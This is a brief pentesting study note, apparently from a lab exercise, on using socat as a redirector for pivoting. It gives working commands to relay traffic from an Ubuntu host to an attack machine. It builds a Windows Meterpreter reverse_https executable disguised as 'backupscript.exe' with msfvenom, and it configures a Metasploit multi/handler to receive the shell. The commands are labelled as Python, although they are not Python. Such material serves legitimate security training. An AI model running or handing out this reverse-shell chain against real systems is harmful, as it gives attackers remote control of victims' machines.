> [Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

- listen on one host and port and forward that data to another IP address and port.
- We can start Metasploit's listener  on our attack host, and we can start `socat` on the Ubuntu server.
#### Starting Socat Listener

```python
 socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

###### What the above command does
- Socat listens on port `8080` and forwards all the traffic to port `80` on our attack host.
- **Then** we can create a payload that'll connect back to our redirector which is currently running on our `ubuntu` server.
- **Then** we'll start a listener on our attack host, where we'll be receiving a shell.
#### Creating the Windows Payload
```python
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

#### Configuring & Starting the multi/handler

```python
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```
